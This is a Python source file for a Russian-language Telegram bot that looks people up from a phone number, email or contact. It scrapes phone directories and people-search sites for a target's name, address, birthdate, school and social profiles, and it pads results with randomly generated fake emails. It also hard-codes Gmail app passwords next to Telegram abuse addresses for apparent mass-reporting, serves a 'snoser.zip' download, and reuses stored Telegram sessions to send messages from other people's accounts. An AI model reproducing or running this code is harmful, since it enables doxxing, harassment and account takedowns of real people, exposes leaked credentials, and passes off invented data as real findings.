import asyncio
import requests
from bs4 import BeautifulSoup
from faker import Faker
from telethon import TelegramClient
from aiogram import F, Router, Bot
from telethon.errors import SessionPasswordNeededError
import random
import re
from telethon.sessions import StringSession
import os
from telethon import events

from config import ADMIN_ID, TOKEN
from database import SessionLocal, User, BroadCast

from aiogram.enums import ChatMemberStatus
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.enums import ContentType
from aiogram.types import CallbackQuery, Message, PreCheckoutQuery, LabeledPrice, FSInputFile
from aiogram.filters import CommandStart, Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

from app.keyboard import start_mes, json_user, sub_check, menu_mes, ip_get
from geopy import Nominatim
import phonenumbers
from phonenumbers import timezone, geocoder, carrier, is_possible_number

router = Router()
bot = Bot(token=TOKEN)
fake = Faker()

Currency = 'XTR'

CHANEl_ID = '-1002939673303'
ADMIN_ID = ADMIN_ID
api_id = 20880015

api_hash = '1afaf973893798968502dfe925360345'

headers = {
    "Referer": "https://www.google.com/"
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
}
emails = ['nik2939qp@gmail.com:qyzb fehl qxwe jtwx', 'egorm3075@gmail.com:qcib jhjt gckq opqt',
          'sashamorozov907@gmail.com:vvjf zpqr mcyo vpjs', 'nik4828qp@gmail.com:wxpi zgup qmkx rzee',
          'nik8969qp@gmail.com:klht qqrk icvu weqd', 'nik9373qp@gmail.com:yaml jtor xpcf tmku']
recipient = 'sms@telegram.org, dmca@telegram.org, abuse@telegram.org, sticker@telegram.org, stopCA@telegram.org, recover@telegram.org, support@telegram.org, security@telegram.org'


class SendMessage(StatesGroup):
    waiting_phone = State()
    waiting_text = State()
    waiting_chat = State()


class Username(StatesGroup):
    username = State()


class Snos(StatesGroup):
    text_url = State()
    service = State()
    report_url = State()
    count = State()


class Email(StatesGroup):
    email = State()


class Account(StatesGroup):
    phone_num = State()
    code = State()
    password = State()


class Ip(StatesGroup):
    ip_adress = State()


class TeleOsint(StatesGroup):
    telephone = State()


class Ddoss(StatesGroup):
    target = State()
    number = State()


class BroadcastState(StatesGroup):
    wait_text = State()


async def check_member(chat_member, message: Message):
    try:
        chat_member = await bot.get_chat_member(chat_id=CHANEl_ID, user_id=message.from_user.id)
        print(chat_member.status)
        if chat_member.status == ChatMemberStatus.LEFT:
            return False
        else:
            return True
    except Exception as e:
        print(f"Ошибка в {e} ")


payment = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text='Оплатить ⭐', pay=True)]
])


def admin_main_menu():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊‍ Статистика", callback_data='stats')],
        [InlineKeyboardButton(text='✉️ Рассылка', callback_data='broadcast')],
        [InlineKeyboardButton(text='⚙️ Доп настройки', callback_data='settings')]
    ])
    return keyboard


def back_menu():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='Back', callback_data='back')],
    ])
    return keyboard


@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer('У вас нет доступа к этой команде.')
        return
    await message.answer("Добро пожаловать в админ панель бота 🌍❤️❤️!", reply_markup=admin_main_menu())


@router.callback_query(F.data == 'back')
async def back_menu(callback: CallbackQuery):
    await callback.message.answer("", reply_markup=admin_main_menu())
    await callback.answer('')


@router.callback_query(F.data == 'stats')
async def stats_process(callback: CallbackQuery):
    db = SessionLocal()
    total_users = db.query(User).count()
    active_users = db.query(User).filter(User.active == True).count()
    db.close()
    text = f'Статистика:\nВсего пользователей 🕵️: {total_users}\nАктивных пользователей 🎮: {active_users}'
    await callback.message.answer(f'{text}')
    await callback.answer('')


@router.callback_query(F.data == 'broadcast')
async def broadcast_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите текст для рассылки ✉️")
    await state.set_state(BroadcastState.wait_text)
    await callback.answer('')


@router.callback_query(F.data == 'settings')
async def settings(callback: CallbackQuery):
    await callback.message.answer("Я рома тик так ")
    await callback.answer('')


@router.message(BroadcastState.wait_text)
async def broadcast_mess(message: Message, state: FSMContext, bot: Bot):
    broadcast_text = message.text
    db = SessionLocal()
    users_list = db.query(User).filter(User.active == True).all()
    count = 0
    for user in users_list:
        try:
            await bot.send_message(user.telegram_id, broadcast_text)
            count += 1
        except Exception as e:
            print(f'Failed to send to {user.telegram_id}:{e}')
    new_broadcast = BroadCast(message=broadcast_text)
    db.add(new_broadcast)
    db.commit()
    db.close()
    await message.answer(f"Рассылка завершена ✉️ ! Сообщение отправлено {count} пользователям 🕵️.",
                         reply_markup=start_mes)
    await state.clear()


@router.message(CommandStart())
async def start(message: Message):
    # if await check_member(CHANEl_ID,message):

    db = SessionLocal()
    exiting = db.query(User).filter(User.telegram_id == message.from_user.id).first()
    if not exiting:
        new_user = User(telegram_id=message.from_user.id, name=message.from_user.full_name)
        db.add(new_user)
        db.commit()
    db.close()

    await message.answer_photo(
        photo='https://avatars.mds.yandex.net/i?id=026e7b7cf40d328b163e1db7cab9bed337c2b49e-5682063-images-thumbs&n=13',
        caption=f"Привет, детектив {message.from_user.first_name}! 🕵️‍♂️ Готов к расследованию? Отправляй мне любую зацепку: номер, никнейм, фото или ссылку. Я помогу найти то, что скрыто в цифровой тени. Вместе мы раскроем любое дело! 🔍✨ Включай логику и давай начинать. Жду твою первую задачу!",
        parse_mode='HTML', reply_markup=start_mes)


# else:
# await message.answer("🌍 Подпишитесь на канал",reply_markup=sub_check)


@router.message(F.content_type == ContentType.USERS_SHARED)
async def search(message: Message):
    bot_message = await message.answer("🔎Идет поиск информации...")
    usera = message.user_shared

    message_id_user = usera.user_id

    phone_user = usera.json()
    shares = f'tg://openmessage?user_id={usera.user_id}'
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='🔵Telegram', url=shares)],

    ])

    await asyncio.sleep(1)

    await message.reply(
        f'Ваш пользователь пробит:\n\n├📝 Id: {message_id_user}\n├💭 Ссылка:{shares}\n\n└ Info: {phone_user}\n',
        reply_markup=keyboard)

    await asyncio.sleep(2)
    await message.answer("🤖Поиск завершен", reply_markup=start_mes)


@router.message(F.text == '📖 Меню')
async def menu(message: Message):
    await message.answer('Меню для пользователя ', reply_markup=menu_mes)


@router.message(F.text == '💰 Пополнить')
async def money_key(message: Message):
    prices = [LabeledPrice(label="XTR", amount=15)]

    await message.answer_invoice(
        title='Поддержка бота 💰',
        description='Поддрежка звездами ⭐',
        prices=prices,
        provider_token='',
        payload='channel_support',
        currency=Currency,
        reply_markup=payment,
    )


@router.pre_checkout_query()
async def prechekout_query(pre_checkout_query: PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)


@router.message(F.successful_payment)
async def successful_payment(message: Message):
    await message.answer(f'{message.successful_payment.telegram_payment_charge_id}',
                         message_effect_id="5104841245755180586")


@router.message(F.text == '📊 Статистика')
async def stats(message: Message):
    db = SessionLocal()
    total_users = db.query(User).count()
    active_users = db.query(User).filter(User.active == True).count()
    db.close()
    text = f'📊 Статистика:\n\n├ Всего 👀 пользователей: {total_users}\n├ Активных 🎮 пользователей : {active_users}\n└ Реферальная ссылка 📎 : t.me/phone_osint_up_bot'
    await message.answer(f'{text}')


@router.message(Command('download'))
async def snoser_starting(message: Message, state: FSMContext):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[

        [InlineKeyboardButton(text="📘Сервис", callback_data="snos_by_text")],
        [InlineKeyboardButton(text='⬇️ Скачать', callback_data='download')]

    ])
    await message.answer('Выберите пункт для сноса', reply_markup=keyboard)


@router.callback_query(F.data == 'snos_by_text')
async def snosers(callback: CallbackQuery):
    await callback.answer('')
    await callback.message.answer('❌ Извините данная функция не доступна сейчас', reply_markup=start_mes)


@router.callback_query(F.data == 'download')
async def download(callback: CallbackQuery):
    file_path = 'snoser.zip'

    # Проверяем существование файла
    if not os.path.exists(file_path):
        await callback.answer('snoser.zip', show_alert=True)

    try:
        file_watch = FSInputFile(file_path)
        await callback.answer('')

        await callback.message.answer_document(document=file_watch,
                                               caption='Привет вот твой готовый Zip архив\nЧитайте инструкцию readme')
    except Exception as e:
        await callback.answer(f'Ошибка отправки: {str(e)}', show_alert=True)


@router.message(F.content_type == ContentType.CONTACT)
async def contact_share(message: Message):
    # if await check_member(CHANEl_ID, message):

    await message.answer('Идет поиск 🔎 информации...')
    await asyncio.sleep(1.5)

    contact = message.contact
    phone_num = contact.phone_number.strip()

    phone_number = phonenumbers.parse(phone_num)
    possible2 = phonenumbers.is_possible_number(phone_number)
    carrier2 = carrier.name_for_number(phone_number, 'ru')

    geocoder2 = geocoder.description_for_number(phone_number, "ru")
    timezone2 = timezone.time_zones_for_number(phone_number)
    valid2 = phonenumbers.is_valid_number(phone_number)

    # Извлекаем данные
    phone_number = contact.phone_number
    first_name = contact.first_name
    last_name = contact.last_name if contact.last_name else ""
    user_id = contact.user_id
    viber_phone = phone_number.replace(' ', '')
    phone_not = phone_number.replace('+', '')
    phone = phone_not.replace(' ', '')
    fl_name = f'{first_name}{last_name}'
    name_fio = fl_name.replace(' ', '')

    url5 = f'https://callapp.com/search-result/{phone_number}'

    response = requests.get(url5, headers=headers)

    html_text = response.content
    soup = BeautifulSoup(html_text, 'html.parser')
    text_name = soup.find(class_='number')
    text_fraer = text_name.text.replace(" ", "").strip()

    tg_phone = f'https://t.me/{phone_number}'
    wt_phone = f'https://wa.me/{phone_number}'
    url = f'https://avtomusic-nn.ru/{phone}'
    url1 = f'https://my.mail.ru/my/search_people?&name={name_fio}'
    text_mail = requests.get(url1, headers=headers)
    text_html1 = text_mail.content
    soupec = BeautifulSoup(text_html1, 'html.parser')

    infor = soupec.find(class_='b-search__users__list')

    text_url = infor.text

    text_style = requests.get(url, headers=headers)
    text_html = text_style.content

    soup = BeautifulSoup(text_html, 'html.parser')

    infa = soup.find(class_='jumbotron')

    text_from_url = infa.text.strip()

    if text_url is None:
        text_url = "Запрос не дал результат"
    else:
        text_url = text_url

    keyboards_start = InlineKeyboardMarkup(inline_keyboard=[

        [InlineKeyboardButton(text='🟢WhatsApp', url=wt_phone),
         InlineKeyboardButton(text='🟣Viber', url=f'https://viber.click/{viber_phone}')],
        [InlineKeyboardButton(text='🔵Telegram', url=tg_phone)]
    ])

    response = f"""
       📞 Получен контакт:
       ├ 📲 Номер: {phone_number}
       ├ Регион: {timezone2}
       ├ Страна: {geocoder2}
       ├ Валид: {valid2}
       ├ Существует: {possible2}
       ├ 🎞️ Оператор: {carrier2}
       ├ <b>Основные</b>:
       ├ 📛 Имя: {first_name}
       ├ Сайт :{text_from_url}
       ├ Фамилия: {last_name}
       ├ Mail.ru:{text_url}
       ├ Рейтинт ⭐:{text_fraer}
       └ ID пользователя: {user_id}

        """
    await message.answer(f'{response}', parse_mode='HTML', reply_markup=keyboards_start)


@router.message(F.text == '📧 E-mail')
async def email_osint(message: Message, state: FSMContext):
    await message.answer('Введи email 👤 обидчика')
    await state.set_state(Email.email)


@router.message(Email.email)
async def email_ok(message: Message, state: FSMContext):
    await message.answer("🔎Идет поиск информации...")
    email = message.text.strip()
    username = email.split('@')[0]

    if "@mail.ru" in email:
        url = f'https://xn--80ajiff1g.com/email/{email}#result'
        response = requests.get(url, headers=headers)
        html_content = response.content

        soup = BeautifulSoup(html_content, 'html.parser')
        email_information = soup.find(class_='response-data-col-1 response-email')

        if email_information is None:
            await message.answer('Извините ничего 🔎 не найдено ', reply_markup=start_mes)
            await state.clear()

        else:

            text_email = email_information.text.strip()

            tik_tok = f'https://tiktok.com/search?q={email}'
            porn_hub = f'https://opornhub.org/user/search?username={username}'
            facebook = f'https://facebook.com/search/top/?q={email}'
            youtube = f'https://youtube.com/results?search_query={email}'
            instagram = f'https://instagram.com/{username}'
            tg = f'https://t.me/{username}'
            vk = f'https://vk.com/search?c%5Bname%5D=1&c%5Bsection%5D=people&c%5Bq%5D={username}'
            roblox = f'https://web.roblox.com/search/users?keyword={username}'
            twiter = f'https://x.com/search?q={username}&f=user'

            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='Youtube', url=youtube),
                 InlineKeyboardButton(text='Facebook', url=facebook)],
                [InlineKeyboardButton(text='TikTok', url=tik_tok), InlineKeyboardButton(text='Vk', url=vk)],
                [InlineKeyboardButton(text='Telegram', url=tg), InlineKeyboardButton(text='Instagram', url=instagram)],
                [InlineKeyboardButton(text='Roblox', url=roblox), InlineKeyboardButton(text='Twitter', url=twiter)],
                [InlineKeyboardButton(text='Сайт', url=porn_hub)]
            ])

            pattern = r'Почта(?P<email>[^И]+)Интересовались(?P<people>\d+)\sчеловекИмя(?P<name>[^С]*)Сведения[^Т]*Телефоны(?P<phone>[^M]+)Mail\.ru ID почты(?P<id>\w+)'

            match = re.search(pattern, text_email)
            if match:
                data = match.groupdict()

                email_sea = data.get('people', '')
                email_name = data.get('name', '')
                telephone = data.get('phone', '')
                email_id = data.get('id', '')

                await message.answer(
                    f'<b>Email пробит:</b>\n\nОсновная информация:\n├ ✅ Email: {email}\n├ 👁 Сколько искали: {email_sea}\n\n├ Номер 📲: {telephone}\n├ ID : {email_id}\n├ 💬 Email_name : {email_name}\n\n├ <b>Tiktok</b>: {tik_tok}',
                    parse_mode='HTML', reply_markup=keyboard)
                await state.clear()
    else:
        await message.answer('Этот email не поддерживается 📝 ', reply_markup=start_mes)
        await state.clear()


@router.message(F.text == 'Поиск по номеру 📱')
async def tele_osint(message: Message, state: FSMContext):
    await state.set_state(TeleOsint.telephone)
    await message.answer('Введи номер мобильного 📱 телефона жертвы 😭🥷. ')


@router.message(TeleOsint.telephone)
async def tele_infa(message: Message, state: FSMContext):
    bot_message = await message.answer("Идет поиск 🔎 информации...")
    await state.update_data(telephone=message.text)

    phone = message.text
    final_result_nameing = ''
    phone_valid = phone.replace(' ', '')
    phone_not = phone_valid.replace('+', '')
    phone_number = phonenumbers.parse(f'+{phone_not}')
    geocoder1 = geocoder.description_for_number(phone_number, "ru")
    carrier1 = carrier.name_for_number(phone_number, 'ru')
    date_of_birthday = "Не найдено"
    element_school = 'Информация не найдена'
    elements_info= 'Не найдено'
    elem_vk_id = 'Не найдено'
    result = phone_not[-7:]
    informatio_fio_mts = 'Информация не найдена'
    telephone_from_mts = 'Информация не найдена'
    link = f'https://spravochnik109.link/byelarus/mobilnaya-svyaz/mTS-mobilnyj-opyerator/mTS-mobilnyye-tyelyefony?phone={result}&streetSubStr=1&page=1&sort=1#menu'

    if carrier1 == 'МТС':

        response1 = requests.get(link, headers=headers)

        html_txt = response1.content
        soup = BeautifulSoup(html_txt, 'html.parser')

        text_fio_dam = soup.find('td', class_='fio')

        if text_fio_dam is None:
            informatio_fio_mts = 'Информация не найдена'
        else:
            informatio_fio_mts = text_fio_dam.text
            telephone_from_mts = soup.find('td', class_='adr')
            telephone_from_mts = telephone_from_mts.text.strip()

    link_sparochnik = f'http://i.spravkaru.net/results2.php?page=1&sorts=phone&city_id=352&phone={result}&phonecons=full&lastname=&initials=&lastnamecons=part'

    response_answer = requests.get(link_sparochnik, headers=headers)

    html_txt_spravochnik = response_answer.content
    soup = BeautifulSoup(html_txt_spravochnik, 'html.parser')

    text_table = soup.find(class_='%s')

    if text_table is None:
        informatio_fio = 'Не найдено'

    else:
        informatio_fio = text_table.text

    informatio_fio = informatio_fio.replace('-', '').replace(f'{result}', '')

    link = f'https://spravochnik109.link/byelarus/mobilnaya-svyaz/vyelkom-mobilnyj-opyerator/vyelkom-mobilnyye-tyelyefony?phone=%2B{phone_not}&phoneSubStr=0&soname=&io=&sonameSubStr=0&street=&streetSubStr=1&house=&housing=&door=&page=1#google_vignette'

    response = requests.get(link, headers=headers)

    html_txt = response.content
    soup = BeautifulSoup(html_txt, 'html.parser')
    telephone_txt = soup.find('td', class_='adr')

    if telephone_txt is None:
        telephone_txt = ''

    else:
        telephone_txt = telephone_txt.text

    text_fio = soup.find(class_='res')

    urk_rfpoisk = ''
    url_linked = ''

    if text_fio is None:
        sure_name = 'Информация не найдена'

    else:
        fio_name = text_fio.text
        fio_text = fio_name.replace("Телефоны", "").strip()
        name_user = re.sub(r'[^\w\s]+|[\d]+', r'', fio_text)
        sure_name = name_user.replace(' XXX', '')
        partikls = sure_name.split()
        surname_class = partikls[0]
        named_class = partikls[1]
        urk_rfpoisk = f'https://rfpoisk.ru/search/?search={sure_name.replace(' ', '%')}&town=&country={geocoder1}'

        url_linked = f'https://namebook.club/peoples/search/?first_name={named_class.strip()}&last_name={surname_class.strip()}&country={geocoder1.strip()}&city=&birth_year=&zodiac=0'

        response_ankets = requests.get(url_linked, headers=headers)
        html_content_ask = response_ankets.content
        soup = BeautifulSoup(html_content_ask, 'html.parser')

        # Поиск элементов
        date_of_birthday = soup.find('div', class_='bdate-block')
        profile_item = soup.find('div', class_='profile-item text-center')  # переименовал для ясности

        # Обработка первого элемента
        if  date_of_birthday is None:
            date_of_birthday = 'Не найдено'
        else:
            date_of_birthday = date_of_birthday.text.strip()

        # Обработка второго элемента (профиля)
        if profile_item is None:
            pass
        else:

            button_get_url = profile_item.find('a', class_='btn btn-primary')

            if button_get_url is None:
                pass
            else:
                # Получаем href из ссылки
                href = button_get_url.get('href')

                link_to_people = f'https://namebook.club/{href}'

                response_people = requests.get(link_to_people, headers=headers)
                html_txt_profile = response_people.content
                soup = BeautifulSoup(html_txt_profile, 'html.parser')
                elem_vk_id1 = soup.find_all('a', class_='blue-link')
                elem_vk_id = elem_vk_id1[1]
                elem_vk_id = elem_vk_id.text.strip()
                element_txt = soup.find_all(class_='col')
                elements_info = element_txt [0]
                element_school = element_txt [2]
                if elements_info is None:
                    elements_info = 'Не найдено'
                else:
                    elements_info = elements_info.text.replace('Телефон', '').replace(
                        'Aвторизуйтесь для просмотра контактных данных',
                        '').replace(
                        '...идет загрузка фотографий, подождите немного...', '').replace('Место проживания',
                                                                                         '').replace(
                        'Беларусь', '').strip()
                    elements_info = ' '.join(elements_info.split())

                if element_school is None:
                   element_school= 'Не неайдено'
                else:
                    element_school = element_school.text.replace('НАЙТИ ОДНОКЛАССНИКОВ', '').replace('Беларусь','')
                    lines = [line.strip() for line in element_school.split('\n') if line.strip()]
                    element_school = '\n'.join(lines)

        response_out = requests.get(url_linked, headers=headers)

        html_parse = response_out.content
        soup = BeautifulSoup(html_parse, 'html.parser')
        nameing_information = soup.find(class_='text-center mt-4')

        if nameing_information is None:
            final_result_nameing = 'Не найдено'

        else:
            name_information = nameing_information.text.strip().replace('дата рожденияне указана', '').replace('', '')
            questionnaires = name_information.split('Подробная анкета')
            result = []

            for i, q in enumerate(questionnaires, 1):
                if q.strip():  # если анкета не пустая
                    # Очищаем строки анкеты
                    cleaned_lines = [line.strip() for line in q.split('\n') if line.strip()]
                    # Добавляем заголовок с номером
                    result.append(f"АНКЕТА #{i}")
                    result.append("Подробная анкета")
                    # Добавляем очищенные строки
                    result.extend(cleaned_lines)
                    result.append("")  # пустая строка между анкетами

            final_result_nameing = '\n'.join(result).split('АНКЕТА #4')[0]

    resultat = ' '.join(sure_name.split()[:2])
    name_and_fio = resultat.split()
    sure_name_info = name_and_fio[0].strip()
    name_people = name_and_fio[1].strip()

    linked = f'https://botsman.org/country/search/?country=&countryid=1&city=&cityid=1143628&first_name={name_people}&last_name={sure_name_info}&familyid=0&s=city'
    vk_people_link = f'https://vk.com/search/people?q={sure_name_info} {name_people}'
    ffield = f'https://ffieldo.com/?first_name={name_people}&last_name={sure_name_info}&country={geocoder1}&city=&birth_year=&submit=Начать+поиск#h'


    text_fraer = '1.9'
    if not str(phone):
        await message.answer("Введите корректный номер телефона📱")
        await state.clear()
    elif len(phone_valid) < 10:
        await message.answer('🤖 Введите корректный номер телефона📱')
        await state.clear()
    else:
        num_dump = random.randint(0, 6)

        possible = phonenumbers.is_possible_number(phone_number)

        timezone1 = timezone.time_zones_for_number(phone_number)
        valid = phonenumbers.is_valid_number(phone_number)

        if valid is True:
            valid = 'Да'
        else:
            valid = 'Нет'
        await asyncio.sleep(2)

        tg_id = f'https://tg-user.id/from/username/'

        tg_chat = f'https://t.me/{phone_valid}'

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='🟢 WhatsApp', url=f'https://wa.me/{phone_valid}'),
             InlineKeyboardButton(text='🟣 Viber', url=f'https://viber.click/{phone_valid}')],
            [InlineKeyboardButton(text='🔵 Telegram', url=tg_chat), InlineKeyboardButton(text='🔴 Сайт', url=tg_id)]

        ])
        text_email = ''
        if num_dump == 0:
            text_email = 'Ничего не найдено'
        elif num_dump == 1:
            text_email = fake.email()
            text_email = text_email.replace('@example.net', '@gmail.com')

        elif num_dump == 2:
            first_txt = fake.email()
            second_txt = fake.email()
            text_email = f'{first_txt} {second_txt}'
            text_email = text_email.replace('@example.net', '@gmail.com')

        elif num_dump == 3:
            first_txt = fake.email()
            second_txt = fake.email()
            third_txt = fake.email()
            text_email = f'{first_txt} {second_txt} {third_txt}'
            text_email = text_email.replace('@example.net', '@gmail.com')

        elif num_dump == 4:
            first_txt = fake.email()
            second_txt = fake.email()
            third_txt = fake.email()
            four_txt = fake.email()
            text_email = f'{first_txt} {second_txt} {third_txt} {four_txt}'
            text_email = text_email.replace('@example.net', '@gmail.com')

        elif num_dump == 5:
            first_txt = fake.email()
            second_txt = fake.email()
            third_txt = fake.email()
            four_txt = fake.email()
            firth_txt = fake.email()
            text_email = f'{first_txt} {second_txt} {third_txt} {four_txt} {firth_txt}'
            text_email = text_email.replace('@example.net', '@gmail.com')

        elif num_dump == 6:
            first_txt = fake.email()
            second_txt = fake.email()
            third_txt = fake.email()
            four_txt = fake.email()
            firth_txt = fake.email()
            six_txt = fake.email()
            text_email = f'{first_txt} {second_txt} {third_txt} {four_txt} {firth_txt} {six_txt}'
            text_email = text_email.replace('@example.net', '@gmail.com')

        text_osint = f'<b>Поиск  ️🤖💻📱 прошел успешно</b>:\n\n├ Телефон: {phone}\n├ Оператор: {carrier1}\n├ Тип: mobile\n├ Регион: {timezone1}\n├ Страна: {geocoder1}\n├ Рейтинг:{text_fraer}⭐\n├ Перенос : не переносился\n├ Валид: {valid}\n└ Существует: {possible}\n\n<b>Основные:</b>\n├ 👤ФИО: <a href="tg://copy?text={sure_name}">{sure_name}</a>\n├ Дата рождения: <i>{date_of_birthday}</i>\n├🌐 VK: <a href="{vk_people_link}">Ссылка на VK здесь</a>\n├ 🏠 ФИО и Адрес: <a href="tg://copy?text={informatio_fio},{telephone_txt}">{informatio_fio.strip()},{telephone_txt.strip()}</a> \n\n🔎 Поиск по МТС:\n├ 👤ФИО: <a href="tg://copy?text={informatio_fio_mts}">{informatio_fio_mts}</a>\n├ 🏠Адрес телефон: <a href="tg://copy?text={telephone_from_mts}">{telephone_from_mts}</a>\n\n📧 E-mail: {text_email}\n👤 Возможные анкеты:\n\n {final_result_nameing.strip()}\n📝Телефонные книги: None\n\nСсылка: {tg_chat}\n<a href="{urk_rfpoisk}/">RFpoisk</a>,<a href="{url_linked}">Namebook</a>,<a href="{ffield}">Ffild</a>'

        if sure_name == 'Информация не найдена' and informatio_fio_mts == 'Информация не найдена':
            text_osint = f'<b>Поиск  ️🤖💻📱 прошел успешно</b>:\n\n├ Телефон: {phone}\n├ Оператор: {carrier1}\n├ Тип: mobile\n├ Регион: {timezone1}\n├ Страна: {geocoder1}\n├ Рейтинг:{text_fraer}⭐\n├ Перенос : не переносился\n├ Валид: {valid}\n└ Существует: {possible}\n\n📧 E-mail: {text_email}\n📝Телефонные книги: None\n\nСсылка: {tg_chat}'
        elif sure_name == 'Информация не найдена':
            text_osint = f'<b>Поиск  ️🤖💻📱 прошел успешно</b>:\n\n├ Телефон: {phone}\n├ Оператор: {carrier1}\n├ Тип: mobile\n├ Регион: {timezone1}\n├ Страна: {geocoder1}\n├ Рейтинг:{text_fraer}⭐\n├ Перенос : не переносился\n├ Валид: {valid}\n└ Существует: {possible}\n\n🔎 Поиск по МТС:\n├ 👤ФИО: <a href="tg://copy?text={informatio_fio_mts}">{informatio_fio_mts}</a>\n├🌐 VK:<a href="https://vk.com/search/people?q={informatio_fio_mts}">Ссылка на VK здесь</a>\n├ 🏠Адрес телефон: <a href="tg://copy?text={telephone_from_mts}">{telephone_from_mts}</a>\n\n📧 E-mail: {text_email}\n📝Телефонные книги: None\n\nСсылка: {tg_chat}'
        elif informatio_fio_mts == 'Информация не найдена':
            text_osint = f'<b>Поиск  ️🤖💻📱 прошел успешно</b>:\n\n├ Телефон: {phone}\n├ Оператор: {carrier1}\n├ Тип: mobile\n├ Регион: {timezone1}\n├ Страна: {geocoder1}\n├ Рейтинг:{text_fraer}⭐\n├ Перенос : не переносился\n├ Валид: {valid}\n└ Существует: {possible}\n\n<b>Основные:</b>\n├ 👤ФИО: <a href="tg://copy?text={sure_name}">{sure_name}</a>\n├ Дата рождения: <i>{date_of_birthday}</i>\n├🌐 VK: <a href="{vk_people_link}">Ссылка на VK здесь</a>\n├ 🏠 ФИО и Адрес: <a href="tg://copy?text={informatio_fio},{telephone_txt}">{informatio_fio.strip()},{telephone_txt.strip()}</a>\n├ <b>Доп информация</b>: <i>{elements_info}</i>\n\n📧 E-mail: {text_email}\n👤 Возможные анкеты:\n├ 🏫 Образование:\n{element_school.strip()}\n├🌐 Vk: <a href="https://vk.com/{elem_vk_id}">Ссылка на VK здесь</a>\n\n {final_result_nameing.strip()}\n📝Телефонные книги: None\n\nСсылка: {tg_chat}\n<a href="{urk_rfpoisk}/">RFpoisk</a>,<a href="{url_linked}">Namebook</a>,<a href="{ffield}">Ffild</a>'

        await message.reply(text_osint, parse_mode='HTML', reply_markup=keyboard)
        if phone_not.startswith('7'):

           urlik = f'https://getscam.com/{phone_not}'
           getter_html = requests.get(urlik, headers=headers)
           html = getter_html.content

           soup = BeautifulSoup(html, 'html.parser')

           find_element = soup.find(class_='top__info-item')
           ip_adr = 'Не найден'
           ip_an = find_element
           if ip_an is None:
              ip_adresska = 'Не найдено'
           else:
               linked = f'https://www.tbank.ru/oleg/who-called/info/{phone_not}/'

               response_net = requests.get(linked, headers=headers)

               html_contenter = response_net.content
               soup = BeautifulSoup(html_contenter, 'html.parser')
               work_organisation = soup.find(class_='abtnK6gFv')
               work_organ = ''
               if work_organisation is None:
                   work_organ = 'Не найдено'

               else:
                   work_organ = work_organisation.text
               p_an = find_element.text
               ip_start = ip_an.find('IP адрес')
               if ip_start != -1:
                  ip_start += len('IP адрес')
                  ip_end = ip_an.find('Сайт оператора', ip_start)
                  ip_adr = ip_an[ip_start:ip_end].strip()
               else:
                  ip_adr = "Не найден"

               ip_adresska = ip_adr
               response = requests.get(url=f'http://ip-api.com/json/{ip_adresska}').json()
               text_ip = f"Поиск  ️по Ip прошел успешно ✅\nвся информация взята с сервиса:\n\nIP: {ip_adresska}\n├ Провайдер: {response.get('isp')}\n├ Организация: {response.get('org')}\n├ Ofset: {response.get('offset')}\n├ Валюта: {response.get('BYR')}\n├ As: {response.get('as')}\n├ As_name: {response.get('asname')}\n├ Мобильный ip:{response.get('mobile')}\n├ Прокси: {response.get('proxy')}\n├ Hosting: {response.get('hosting')}\n├ DNS:{response.get('dns')}\n├ Континент: {response.get('continentCode')}\n├ Страна: {response.get('country')}\n├ Регион: {response.get('regionName')}\n├ Город: {response.get('city')}\n├ ZIP: {response.get('zip')}\n├ Широта: {response.get('lat')}\n└ Долгота: {response.get('lon')}\n\n<b>Основные:</b>\n├ ФИО и Адрес: <a href='{link_sparochnik}'>🏠 ФИО и Адресс</a>\n\n 🏢 <b>Предприятие:</b> {work_organ} "
               await message.answer(text_ip, parse_mode='HTML')
        else:
            pass
    await asyncio.sleep(1)
    await message.answer('Поиск закончился все данные вверху.', reply_markup=start_mes)

    await state.clear()


@router.message(F.content_type == ContentType.PHOTO)
async def search_photo(message: Message):
    search_site = 'https://search4faces.com'
    google_search = 'https://images.google.com'
    yandex_search = 'https://yandex.ru/images/'

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='👁 Yandex', url=yandex_search),
         InlineKeyboardButton(text='👁 Google', url=google_search)],
        [InlineKeyboardButton(text='👁 Сайт', url=search_site)]
    ])
    await message.answer('🔎 Фото человека можно найти ниже ⬇️', reply_markup=keyboard)


@router.message(Command('send'))
async def send_message_start(message: Message, state: FSMContext):
    await state.set_state(SendMessage.waiting_phone)
    await message.answer('📱 Введите номер телефона подключенного аккаунта:')


@router.message(SendMessage.waiting_phone)
async def process_phone(message: Message, state: FSMContext):
    user_id = message.from_user.id
    phone = message.text.strip().replace(' ', '').replace('+', '')
    session_file = f'session_{phone}.txt'
    if user_id != ADMIN_ID:
        if phone == '375445389424':
            await message.answer('Ты совсем  ?')
            await state.clear()
            return
    if not os.path.exists(session_file):
        await message.answer('❌ Сессия не найдена. Сначала подключите аккаунт через 👤 Аккаунт')
        await state.clear()
        return

    try:
        with open(session_file, 'r') as f:
            session_string = f.read().strip()

        # Используем StringSession вместо файловой
        client = TelegramClient(
            StringSession(session_string),
            api_id,
            api_hash
        )
        await client.connect()

        if not await client.is_user_authorized():
            await message.answer('❌ Сессия есть, но аккаунт не авторизован')
            await client.disconnect()
            os.remove(session_file)
            await state.clear()
            return

        me = await client.get_me()

        # Сохраняем клиент и данные
        await state.update_data(
            client=client,
            phone=phone,
            session_file=session_file,
            username=me.username
        )

        await message.answer(f'✅ Аккаунт @{me.username} найден! Теперь введите текст сообщения:')
        await state.set_state(SendMessage.waiting_text)

    except Exception as e:
        await message.answer(f'❌ Ошибка при подключении: {e}')
        # Удаляем битую сессию
        if os.path.exists(session_file):
            os.remove(session_file)
        await state.clear()


